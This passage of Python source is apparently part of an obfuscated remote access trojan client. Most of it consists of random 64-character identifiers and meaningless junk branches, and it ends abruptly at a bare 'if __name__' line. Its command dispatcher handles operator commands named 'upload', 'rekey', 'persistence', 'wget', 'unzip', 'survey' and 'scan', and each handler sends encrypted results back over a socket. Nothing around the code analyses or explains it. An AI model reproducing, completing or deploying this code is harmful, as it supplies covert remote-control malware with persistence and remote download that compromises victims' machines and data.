                BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn = BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn.strip()
                gyEOxeZsdJwUGZYgHHjnAcyVnMSFdVEoTXtZeIXivuMhKxmmOUmZwswTamNUpaob(AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW, BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz)
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'upload':
            OxbaTEkhsQkuyTFlhuuEFnwofuYSvwSLYsqbtXfBWJiAuAQONAIWWFdySRwjOelQ = 'RckwtTCcpqofUzckugvHTvqBZjRRencDgAdWyxBmSYWCtPUfczznJLPsdvxTkLHZ'
            JIFFSedwQkoJiujJvtQrFiWvGzYBezonVYyTezNuUeLDSfVHJoYySnEyxGwyZqQl = 'gqeLVlRpdwoXgRbhfWorRntEdHYTjscNxYrIbxZlwTSwqmdhesZrXxgYUStFitvo'
            dhiSKdZOhtCHmBUlKIMOBumnfMgdQxdPOtrREFtqRJPuXlRMBYOgmrYZYzFGNIMr = 'HACYVbSCNtKXAEdcaJUwJkZQNIqeuwKjYQSugwoxsFuFYEOVoMxZVkvjGfNBqxXO'
            if OxbaTEkhsQkuyTFlhuuEFnwofuYSvwSLYsqbtXfBWJiAuAQONAIWWFdySRwjOelQ == JIFFSedwQkoJiujJvtQrFiWvGzYBezonVYyTezNuUeLDSfVHJoYySnEyxGwyZqQl:
                hQkDszhrnxaBHQGKJaFFPvVXREtLhwthzMNGhRkEMKvTBRRqZIQEeTuaWeAcOMIj = 'RbdwzBVlRbDTGrGBZRBqGRNJnAlgKBXrysrGGZEWyAOKrXJWJQZaUprByqoUlwIe'
                hQkDszhrnxaBHQGKJaFFPvVXREtLhwthzMNGhRkEMKvTBRRqZIQEeTuaWeAcOMIj = OxbaTEkhsQkuyTFlhuuEFnwofuYSvwSLYsqbtXfBWJiAuAQONAIWWFdySRwjOelQ
            else:
                hQkDszhrnxaBHQGKJaFFPvVXREtLhwthzMNGhRkEMKvTBRRqZIQEeTuaWeAcOMIj = 'RbdwzBVlRbDTGrGBZRBqGRNJnAlgKBXrysrGGZEWyAOKrXJWJQZaUprByqoUlwIe'
                hQkDszhrnxaBHQGKJaFFPvVXREtLhwthzMNGhRkEMKvTBRRqZIQEeTuaWeAcOMIj = dhiSKdZOhtCHmBUlKIMOBumnfMgdQxdPOtrREFtqRJPuXlRMBYOgmrYZYzFGNIMr
            for BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn in action.split():
                bbjhHHQxxpuYuwyANbFAFoLIxfgYoYIMVJIDGLzLNxPJtfaxfQSgUXENNOFuZWZk = 'RZupbeXbEyEDhPcznZRgsCzuAYhVYbdqFSFhGuEgOUJjkzMmsaFSAJYkJeNGinqQ'
                VfZyzXSKsHCtKvUWEUnmyTMHndqFQsuVuzTkaobAqUTaMxFgQqzRBZDIoWcAxpQw = 'ktcCNQaEjXCsAPYOXdBcUXnPcLdJBxroRXvcEwHMBBvMAUUrrZkUnObimaKaEfQz'
                kFSLTzhmpkyKgcCSJCYYrVBArwIOiZwcZajpxEdFDMyzzJpzzwLsCFdaerSriIBS = 'xByhkYuOwlhSnUdNjTWQQUkejOiHTepMEhAIfZVnYGfLeWksBOlvAYkkDDGRONcJ'
                lelpFeguuhsuVeCgyYxpDMTizHcErfLGkwhvdmnmZQLvqNtzwJHoOBpOdrWXcoKV = 'fxyvsuwANDChXRHOuDQBAelThrzlVbUrJCmUxlTrdtWqJzCxdVqaeujxLYdrXOaC'
                ZaGYYvuaezNdQIgjfBbNZAKuAslGtONoOBRUPlocNKFPDZcOIcWRMJmKYWqMAveh = 'jBkxKtCZSSjBWJOGrQdPzWacrcLHibnAGeclpTFWxraZEwyRPPVSClGNhrxDLBxR'
                YfllqwXUfZPwUCOfdInqKiBiZFAhdTzkSICJKzYGqoKqwEGnvGNHVyOOyZcGKnnB = 'IQkrNLVCdIxRiGhgGVViOWyEKvQguBgBlBEuxsXNsZFfYEnVFbcfEdWRRFdExiDz'
                if bbjhHHQxxpuYuwyANbFAFoLIxfgYoYIMVJIDGLzLNxPJtfaxfQSgUXENNOFuZWZk != lelpFeguuhsuVeCgyYxpDMTizHcErfLGkwhvdmnmZQLvqNtzwJHoOBpOdrWXcoKV:
                    VfZyzXSKsHCtKvUWEUnmyTMHndqFQsuVuzTkaobAqUTaMxFgQqzRBZDIoWcAxpQw = kFSLTzhmpkyKgcCSJCYYrVBArwIOiZwcZajpxEdFDMyzzJpzzwLsCFdaerSriIBS
                    for YfllqwXUfZPwUCOfdInqKiBiZFAhdTzkSICJKzYGqoKqwEGnvGNHVyOOyZcGKnnB in lelpFeguuhsuVeCgyYxpDMTizHcErfLGkwhvdmnmZQLvqNtzwJHoOBpOdrWXcoKV:
                        if YfllqwXUfZPwUCOfdInqKiBiZFAhdTzkSICJKzYGqoKqwEGnvGNHVyOOyZcGKnnB != kFSLTzhmpkyKgcCSJCYYrVBArwIOiZwcZajpxEdFDMyzzJpzzwLsCFdaerSriIBS:
                            VfZyzXSKsHCtKvUWEUnmyTMHndqFQsuVuzTkaobAqUTaMxFgQqzRBZDIoWcAxpQw = VfZyzXSKsHCtKvUWEUnmyTMHndqFQsuVuzTkaobAqUTaMxFgQqzRBZDIoWcAxpQw
                        else:
                            ZaGYYvuaezNdQIgjfBbNZAKuAslGtONoOBRUPlocNKFPDZcOIcWRMJmKYWqMAveh = bbjhHHQxxpuYuwyANbFAFoLIxfgYoYIMVJIDGLzLNxPJtfaxfQSgUXENNOFuZWZk
                else:
                    kFSLTzhmpkyKgcCSJCYYrVBArwIOiZwcZajpxEdFDMyzzJpzzwLsCFdaerSriIBS = bbjhHHQxxpuYuwyANbFAFoLIxfgYoYIMVJIDGLzLNxPJtfaxfQSgUXENNOFuZWZk
                    bbjhHHQxxpuYuwyANbFAFoLIxfgYoYIMVJIDGLzLNxPJtfaxfQSgUXENNOFuZWZk = ZaGYYvuaezNdQIgjfBbNZAKuAslGtONoOBRUPlocNKFPDZcOIcWRMJmKYWqMAveh
                    if kFSLTzhmpkyKgcCSJCYYrVBArwIOiZwcZajpxEdFDMyzzJpzzwLsCFdaerSriIBS == bbjhHHQxxpuYuwyANbFAFoLIxfgYoYIMVJIDGLzLNxPJtfaxfQSgUXENNOFuZWZk:
                        for YfllqwXUfZPwUCOfdInqKiBiZFAhdTzkSICJKzYGqoKqwEGnvGNHVyOOyZcGKnnB in bbjhHHQxxpuYuwyANbFAFoLIxfgYoYIMVJIDGLzLNxPJtfaxfQSgUXENNOFuZWZk:
                            if YfllqwXUfZPwUCOfdInqKiBiZFAhdTzkSICJKzYGqoKqwEGnvGNHVyOOyZcGKnnB == kFSLTzhmpkyKgcCSJCYYrVBArwIOiZwcZajpxEdFDMyzzJpzzwLsCFdaerSriIBS:
                                kFSLTzhmpkyKgcCSJCYYrVBArwIOiZwcZajpxEdFDMyzzJpzzwLsCFdaerSriIBS = bbjhHHQxxpuYuwyANbFAFoLIxfgYoYIMVJIDGLzLNxPJtfaxfQSgUXENNOFuZWZk
                            else:
                                kFSLTzhmpkyKgcCSJCYYrVBArwIOiZwcZajpxEdFDMyzzJpzzwLsCFdaerSriIBS = ZaGYYvuaezNdQIgjfBbNZAKuAslGtONoOBRUPlocNKFPDZcOIcWRMJmKYWqMAveh
                BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn = BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn.strip()
                FRoDRlsJIAlzmRsiLfnTwPbAAJhNPzLZiqmTHwMxrMnMNWnHWWCvyIklDxFOqKIe(AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW, BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz)
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'rekey':
            CbrsqrIguXjFmYQEJPqZvReQaQrtZGWLPdAImMCjyQxDBjBOSwSCGCuxqhVDilep = 'EiBljFXzYpYmrcqwtwJdWhrmlvTQSfGNUutoumsauSmsadeJWcBWxrurXGctKoJf'
            ZWdYwLvkUUNzxXBSJRxeGiwYNDprYOGHooZiclALyqRXvYAUAUpiqmSLFjqCfXOQ = 'DrmefrgXfyDqJEhhRkKNkcoAgMSkKPCyNJQBafSpKExNDbwFMEbihwIILChaxykO'
            mwUBBQuPAoHJXkQMcqFjvpXGvKixvweDfUcCdREWnAgckwumNuCbgerhxqTNWbOk = 'mutZFFDODwiQmKbxJChRzVkSplmojNbqSugOAjyRCyzvuJCXDBPKIevjJgTNJhtm'
            if CbrsqrIguXjFmYQEJPqZvReQaQrtZGWLPdAImMCjyQxDBjBOSwSCGCuxqhVDilep == ZWdYwLvkUUNzxXBSJRxeGiwYNDprYOGHooZiclALyqRXvYAUAUpiqmSLFjqCfXOQ:
                RJGaCoilTaGGWFfmyGUiKGbgGuOcRcewsYdzjJTophfFgqbJEeeGDqebcUDhiyKr = 'IqYFMcXthbaOnbSYKrBEkVSlbnPahdAsGWExUhuDFcUeVtnqFcHCUFOneegHMWox'
                RJGaCoilTaGGWFfmyGUiKGbgGuOcRcewsYdzjJTophfFgqbJEeeGDqebcUDhiyKr = CbrsqrIguXjFmYQEJPqZvReQaQrtZGWLPdAImMCjyQxDBjBOSwSCGCuxqhVDilep
            else:
                RJGaCoilTaGGWFfmyGUiKGbgGuOcRcewsYdzjJTophfFgqbJEeeGDqebcUDhiyKr = 'IqYFMcXthbaOnbSYKrBEkVSlbnPahdAsGWExUhuDFcUeVtnqFcHCUFOneegHMWox'
                RJGaCoilTaGGWFfmyGUiKGbgGuOcRcewsYdzjJTophfFgqbJEeeGDqebcUDhiyKr = mwUBBQuPAoHJXkQMcqFjvpXGvKixvweDfUcCdREWnAgckwumNuCbgerhxqTNWbOk
            WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz = ZnSlsMtPHuxZiZtdggZNNZbzlZGOKaVkpkTQLVelCtNuiCQWxtNSxMyhJZsAWbwr(AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW)
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'persistence':
            klEXiUShwdsIrZIvSQKajdYxsbWrDGffdBDqGwZkeaKLakaVoqALLhkbljGfYKIY = 'xLYOPsEiYpZhMFrLgQfDiVvZpRppqPMAXfQcCQGRKUleWUMcFmmNVlmrtHhsouGD'
            pdBYAmEqrHSyxpBvUOWeFwXRVgwHvuYQeidsjUCSsFQolmHJdYdwVaYjnFPFRodF = 'OJyxnGvVmBeeKIPYMIZPyvcNJhxzcgdddTyVLAxQKtGuoGKmOluWJeadKRtuKAOJ'
            TuvzKvjLCDZJBTDAkZIDDPrWOzoEyozWjqXxqrzrkdlxXGVltaAUcPgTUbavDFek = 'tCLzRWBkttjqRNnWpEhkXzWBfZJCOSMACieMUWndOQAXiyEJffBYZsjNnmPLKNKT'
            zmnDAxGLGBSMAANhopHYcwxZbwCQtEZvkvkwdgSSOOQxXpcCvBHmHlCQDzyigufk = 'BXWNkebuhceSdsyxlcKsBhpmYogRopkFVeMCcSoJIWtxVFDvsQPncUnquBdcDVjL'
            GqEnSzeMXMIKgiySFHmEqyMxOwWSVRrNhklPoQnEMMIpwSLuxLJcAhvLclbTXGOD = 'dmvvbVRpXcrKphExGsKxRWRKmQkaQAdwopkuzvQiPSVSMrYnUOhMPAbCKflRqgIM'
            if klEXiUShwdsIrZIvSQKajdYxsbWrDGffdBDqGwZkeaKLakaVoqALLhkbljGfYKIY in pdBYAmEqrHSyxpBvUOWeFwXRVgwHvuYQeidsjUCSsFQolmHJdYdwVaYjnFPFRodF:
                klEXiUShwdsIrZIvSQKajdYxsbWrDGffdBDqGwZkeaKLakaVoqALLhkbljGfYKIY = GqEnSzeMXMIKgiySFHmEqyMxOwWSVRrNhklPoQnEMMIpwSLuxLJcAhvLclbTXGOD
                if pdBYAmEqrHSyxpBvUOWeFwXRVgwHvuYQeidsjUCSsFQolmHJdYdwVaYjnFPFRodF in TuvzKvjLCDZJBTDAkZIDDPrWOzoEyozWjqXxqrzrkdlxXGVltaAUcPgTUbavDFek:
                    pdBYAmEqrHSyxpBvUOWeFwXRVgwHvuYQeidsjUCSsFQolmHJdYdwVaYjnFPFRodF = zmnDAxGLGBSMAANhopHYcwxZbwCQtEZvkvkwdgSSOOQxXpcCvBHmHlCQDzyigufk
            elif pdBYAmEqrHSyxpBvUOWeFwXRVgwHvuYQeidsjUCSsFQolmHJdYdwVaYjnFPFRodF in klEXiUShwdsIrZIvSQKajdYxsbWrDGffdBDqGwZkeaKLakaVoqALLhkbljGfYKIY:
                TuvzKvjLCDZJBTDAkZIDDPrWOzoEyozWjqXxqrzrkdlxXGVltaAUcPgTUbavDFek = pdBYAmEqrHSyxpBvUOWeFwXRVgwHvuYQeidsjUCSsFQolmHJdYdwVaYjnFPFRodF
                if TuvzKvjLCDZJBTDAkZIDDPrWOzoEyozWjqXxqrzrkdlxXGVltaAUcPgTUbavDFek in pdBYAmEqrHSyxpBvUOWeFwXRVgwHvuYQeidsjUCSsFQolmHJdYdwVaYjnFPFRodF:
                    pdBYAmEqrHSyxpBvUOWeFwXRVgwHvuYQeidsjUCSsFQolmHJdYdwVaYjnFPFRodF = GqEnSzeMXMIKgiySFHmEqyMxOwWSVRrNhklPoQnEMMIpwSLuxLJcAhvLclbTXGOD
            wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd = MLHlzBrlHlRHgwQrfyWjACciGuFXCTKNwPUFwdxLvtefBBDIaFXJNJlgiRrJVSjP(XDhqiSBqqiFiqAgFiYQNboyjAFIxuznJhrIquwkaGtiHtHXVvNOjqPkCjiZqcNTw)
            AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.send(aRmegvZNDGuhCtVQAlakKtZRoZafnQqupvFkrdupYnNDQMdYpuVagixWOykbEOkE(wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz))
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'wget':
            ZcvISHLYFOPunFMJNQWrAsFIqNFTscKRlCzcYrTCjOZyOFrgrruFIVfGZLidtudV = 'TTjURDpgynYceGVbGnEIVVrlNHNPwawqCPFUAoDvSIdultuDsoBjMyeradQFNsMV'
            yGTDLztXaFmFXJOgGjecoOjePgfdsiVUkISCuZwiQQgUMVIFuKyrGdPfZBbWHaJv = 'NokzZEnadNbRoMTrWKojvypZrzMKsskHFLNYkUNUKyhvifoIyIwcNPvQktHBRRrZ'
            TeXLahiTpHFqmeTgYODWYPBaGqcQEfoYzEbyCWbLXoBPUfUmZDbiuwOJcRipRkbR = 'yXOBhXyzbphnXCfTpKkjIgRxshMosljkQYdKZjXTSUAkRnJrnLkWmsbsCBIdlNPj'
            rVOMCRsaBpdosfrUZzVDRuyyNFyXQWXUdvhXlfXIREdfFSThvYDyhWDyExkLsith = 'dOOOjagAxwLhjNVHRfuTIQmXnVcpnjMfpbevbVJVQyrVbuKGHgkLxzqNEJLZhYmG'
            WNqzUwzvvAYfgZGrafJxydlvoqBlKSWdWAIBjMTxEhAyYdiJFeuhXcdynBBDJnWa = 'ZLqBFPBFLJeAGkDoaEYFfVrTetJylCLQanXjHXqFovEpsIaxeMufxcBTkYNeaERA'
            if ZcvISHLYFOPunFMJNQWrAsFIqNFTscKRlCzcYrTCjOZyOFrgrruFIVfGZLidtudV in yGTDLztXaFmFXJOgGjecoOjePgfdsiVUkISCuZwiQQgUMVIFuKyrGdPfZBbWHaJv:
                ZcvISHLYFOPunFMJNQWrAsFIqNFTscKRlCzcYrTCjOZyOFrgrruFIVfGZLidtudV = WNqzUwzvvAYfgZGrafJxydlvoqBlKSWdWAIBjMTxEhAyYdiJFeuhXcdynBBDJnWa
                if yGTDLztXaFmFXJOgGjecoOjePgfdsiVUkISCuZwiQQgUMVIFuKyrGdPfZBbWHaJv in TeXLahiTpHFqmeTgYODWYPBaGqcQEfoYzEbyCWbLXoBPUfUmZDbiuwOJcRipRkbR:
                    yGTDLztXaFmFXJOgGjecoOjePgfdsiVUkISCuZwiQQgUMVIFuKyrGdPfZBbWHaJv = rVOMCRsaBpdosfrUZzVDRuyyNFyXQWXUdvhXlfXIREdfFSThvYDyhWDyExkLsith
            elif yGTDLztXaFmFXJOgGjecoOjePgfdsiVUkISCuZwiQQgUMVIFuKyrGdPfZBbWHaJv in ZcvISHLYFOPunFMJNQWrAsFIqNFTscKRlCzcYrTCjOZyOFrgrruFIVfGZLidtudV:
                TeXLahiTpHFqmeTgYODWYPBaGqcQEfoYzEbyCWbLXoBPUfUmZDbiuwOJcRipRkbR = yGTDLztXaFmFXJOgGjecoOjePgfdsiVUkISCuZwiQQgUMVIFuKyrGdPfZBbWHaJv
                if TeXLahiTpHFqmeTgYODWYPBaGqcQEfoYzEbyCWbLXoBPUfUmZDbiuwOJcRipRkbR in yGTDLztXaFmFXJOgGjecoOjePgfdsiVUkISCuZwiQQgUMVIFuKyrGdPfZBbWHaJv:
                    yGTDLztXaFmFXJOgGjecoOjePgfdsiVUkISCuZwiQQgUMVIFuKyrGdPfZBbWHaJv = WNqzUwzvvAYfgZGrafJxydlvoqBlKSWdWAIBjMTxEhAyYdiJFeuhXcdynBBDJnWa
            wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd = evwfnnvaUOxIdMSgirgwaYEUBMkoGZPUXYRwwPpBxecmgtvpxuHAFbjKNjPJvTIt(action)
            AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.send(aRmegvZNDGuhCtVQAlakKtZRoZafnQqupvFkrdupYnNDQMdYpuVagixWOykbEOkE(wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz))
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'unzip':
            UePwUfiVuXCYFdTHARvNxsZkPShDGnimxcjNnciMEjQzwzZsxQqUZYlULIcGkgjN = 'HOrHHzMBbYkrMtPxmOwmsyIODobtqYkzsrsZQfKEbAhgsozTakrmfFSGUUmJggJS'
            jEhShnRpGJxWXnlKzdKkpIrHotMhEWDmADFLTFkwesXMuiZDFhMFjKsEYnOINaId = 'yVzTADzinJgbqwIvFOaaIZzjVvqsSitGtnxCgyRrUrEXKTcMUhFFJfBRhNVDaHAc'
            iAnrMGFHDjqUYQfmoFOQXeusLzBewKSSTjzMCHLNxUktZaSjFxYFKHMQPKQXewFg = 'NidQeoeFxJABdCBeOSwkSMCZXGhCkzFZwlDxJSsDOZIhocpKNKLKuiGfrCnlYeJd'
            LlktPIgYDRnLBTCeQjMwMWUYlLsLfsTUQjaLtwFcJDDMkWZaxxHkqJVVqKyUkIpr = 'qsvVzhLvCWWcQBTgzGIqymDZjaZIkjvIWJBlektetAfmcUuOudPDAmDSZSdeGjFC'
            cqvwcHADneJPwIZTjZqNpIXvwLfkcXMWOwIHABUrKNmRBvnSCACSQVCRIaetWbwx = 'pYblgezLwocdGYveXsDPFMpthznoDTUocXBXhGEPFSPGiYiBKxRXeJTxwVupSQWX'
            SCFjZMmAtZylTbFyXIAxvsJsaUBLUKcLnhzIvHtdmocqpTkrzySpEfYeRocpLvBG = 'GxoiUWUnlfrZWqCbMFaoUFRczfURqiRegJHXVlOSOTyhguIADPNtmWRNRHPALDmb'
            if iAnrMGFHDjqUYQfmoFOQXeusLzBewKSSTjzMCHLNxUktZaSjFxYFKHMQPKQXewFg == LlktPIgYDRnLBTCeQjMwMWUYlLsLfsTUQjaLtwFcJDDMkWZaxxHkqJVVqKyUkIpr:
                for SCFjZMmAtZylTbFyXIAxvsJsaUBLUKcLnhzIvHtdmocqpTkrzySpEfYeRocpLvBG in cqvwcHADneJPwIZTjZqNpIXvwLfkcXMWOwIHABUrKNmRBvnSCACSQVCRIaetWbwx:
                    if SCFjZMmAtZylTbFyXIAxvsJsaUBLUKcLnhzIvHtdmocqpTkrzySpEfYeRocpLvBG == LlktPIgYDRnLBTCeQjMwMWUYlLsLfsTUQjaLtwFcJDDMkWZaxxHkqJVVqKyUkIpr:
                        cqvwcHADneJPwIZTjZqNpIXvwLfkcXMWOwIHABUrKNmRBvnSCACSQVCRIaetWbwx = UePwUfiVuXCYFdTHARvNxsZkPShDGnimxcjNnciMEjQzwzZsxQqUZYlULIcGkgjN
                    else:
                        LlktPIgYDRnLBTCeQjMwMWUYlLsLfsTUQjaLtwFcJDDMkWZaxxHkqJVVqKyUkIpr = jEhShnRpGJxWXnlKzdKkpIrHotMhEWDmADFLTFkwesXMuiZDFhMFjKsEYnOINaId
            wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd = PaWZzpbpfTKwFKTszKjPMAaKVVnWBESorGAyTpBuTKufbJYlvVUoiWXaAGYgjFrj(action)
            AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.send(aRmegvZNDGuhCtVQAlakKtZRoZafnQqupvFkrdupYnNDQMdYpuVagixWOykbEOkE(wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz))
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'survey':
            CEdOVzxUMdIwIsxbHSkyhxgppxIICVUlGjYKGcMBSQFMWFlEGtBKtuWjWwDdXoeV = 'QSsflFAPljomcwFKqfaqldCCPZhPcWLsVKmSHfJTDSmNXzRNzcfwSSjOSkyibyfH'
            YaOANpXOyyWTxFOyFadSqRbRHUwwqTaybdykrBMojfOEENTIzicTjdwrevlXqBMp = 'gQRCSbICDATyDttOqhvuIOwRwfBhmAHoFujKaJvycIqCIAIeQvByTCJVLmDxIfUY'
            soXbXPqtFqhQrqiAdByKSsXFnLwxUTfBymFPzWKNOtXRdGLoZoObnFjlFtmFSzhC = 'SCdbfFWHVBzyvyIZnFNIDolpcPEVJtHtvQfyYsnFLEmytvpkpCbeCGhIdMGkynKY'
            PrEfVCFQIXPqXKhvbCEfLEipuTtEFumgUpoBlFSEeqZphZZbMvOoUXvNDRezsnkw = 'fhqLUDFwuJJcdhswgKOFbtueLIQbbDLoVXwrsTtrfZcqrOBdpqysRPELBcZXPvrk'
            xPLnKJvEnaYiVAVUdGzljrxkhjbPKRaFGbDbwITCghslDnAHkvGGmWUuvuJmdNwH = 'MfAqKmnYsJNLZSMEjDOZeNCBPqFtYEOLLJzHPmvngKtkaiEImqAPLDYdUqVfPIxT'
            EhjxuGBUbEjlTTWvpBIJuyVJSDFapfAaEUHXcnwgKneFecXXpbllSsaKsVfIfzUo = 'xkQVOiDbJvjlnrcBtqJEcnVbGioJCclJHwlPcNhPXagaMFkiDvohJgPvXisVbWTv'
            if soXbXPqtFqhQrqiAdByKSsXFnLwxUTfBymFPzWKNOtXRdGLoZoObnFjlFtmFSzhC == PrEfVCFQIXPqXKhvbCEfLEipuTtEFumgUpoBlFSEeqZphZZbMvOoUXvNDRezsnkw:
                for EhjxuGBUbEjlTTWvpBIJuyVJSDFapfAaEUHXcnwgKneFecXXpbllSsaKsVfIfzUo in xPLnKJvEnaYiVAVUdGzljrxkhjbPKRaFGbDbwITCghslDnAHkvGGmWUuvuJmdNwH:
                    if EhjxuGBUbEjlTTWvpBIJuyVJSDFapfAaEUHXcnwgKneFecXXpbllSsaKsVfIfzUo == PrEfVCFQIXPqXKhvbCEfLEipuTtEFumgUpoBlFSEeqZphZZbMvOoUXvNDRezsnkw:
                        xPLnKJvEnaYiVAVUdGzljrxkhjbPKRaFGbDbwITCghslDnAHkvGGmWUuvuJmdNwH = CEdOVzxUMdIwIsxbHSkyhxgppxIICVUlGjYKGcMBSQFMWFlEGtBKtuWjWwDdXoeV
                    else:
                        PrEfVCFQIXPqXKhvbCEfLEipuTtEFumgUpoBlFSEeqZphZZbMvOoUXvNDRezsnkw = YaOANpXOyyWTxFOyFadSqRbRHUwwqTaybdykrBMojfOEENTIzicTjdwrevlXqBMp
            wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd = MLHlzBrlHlRHgwQrfyWjACciGuFXCTKNwPUFwdxLvtefBBDIaFXJNJlgiRrJVSjP(XDhqiSBqqiFiqAgFiYQNboyjAFIxuznJhrIquwkaGtiHtHXVvNOjqPkCjiZqcNTw)
            AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.send(aRmegvZNDGuhCtVQAlakKtZRoZafnQqupvFkrdupYnNDQMdYpuVagixWOykbEOkE(wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz))
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'scan':
            BlIuCcDFVdXLqZdVLRTUYrmzIRbRsXsXeSdAGrSErjctBaqghFiYbdtUjGWKnSZK = 'rFZNceSyGBdSyGymYEykFuufSsnGRZcitPGBhfQyUZLkQfNcpvHyJSWglpcdShrI'
            wxQbtglFogYtWOBClCbCTCGTpWiSXhXEKeGNdtFtjOFxNsbPvOFpNRanFxhBFtLq = 'LRhUwCEWgSsQKpKuwXLnpvBHXgMUVLPtPuVMFfuzRbEcjicVSXVLtcUZaIQzVtbc'
            eSKPpTEmxCGMlmTdkmXiBpAQhyxuSpwdXOAeTJDFNifRQKIadUsKZYVEAqVGdawJ = 'SSJhhcogNpCjzcGKkqWZKXbRbBRFCTiIyudhJKVVgEOtlEAJNaEMIaWMhGgZmFbb'
            if BlIuCcDFVdXLqZdVLRTUYrmzIRbRsXsXeSdAGrSErjctBaqghFiYbdtUjGWKnSZK == wxQbtglFogYtWOBClCbCTCGTpWiSXhXEKeGNdtFtjOFxNsbPvOFpNRanFxhBFtLq:
                KMCdgqYOyjFOZCDLzopQLLiWZVmrqcmznbVOiIvDrMIilWSiKGyvMWWoGbIwjirY = 'iRZEXVpIWjgFQhrAcWRIjWSTviuftcglOsKlRQoTiHseQsEyyQkrrCsgLMZdLoMC'
                KMCdgqYOyjFOZCDLzopQLLiWZVmrqcmznbVOiIvDrMIilWSiKGyvMWWoGbIwjirY = BlIuCcDFVdXLqZdVLRTUYrmzIRbRsXsXeSdAGrSErjctBaqghFiYbdtUjGWKnSZK
            else:
                KMCdgqYOyjFOZCDLzopQLLiWZVmrqcmznbVOiIvDrMIilWSiKGyvMWWoGbIwjirY = 'iRZEXVpIWjgFQhrAcWRIjWSTviuftcglOsKlRQoTiHseQsEyyQkrrCsgLMZdLoMC'
                KMCdgqYOyjFOZCDLzopQLLiWZVmrqcmznbVOiIvDrMIilWSiKGyvMWWoGbIwjirY = eSKPpTEmxCGMlmTdkmXiBpAQhyxuSpwdXOAeTJDFNifRQKIadUsKZYVEAqVGdawJ
            wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd = jANnrqLDCAEfkgFTduiUjLLoWvNOXRIWSAfakIBQROyTBCbyDjUIOyFqHWLZjXow(action)
            AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.send(aRmegvZNDGuhCtVQAlakKtZRoZafnQqupvFkrdupYnNDQMdYpuVagixWOykbEOkE(wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz))
if __name__ == '__main__':
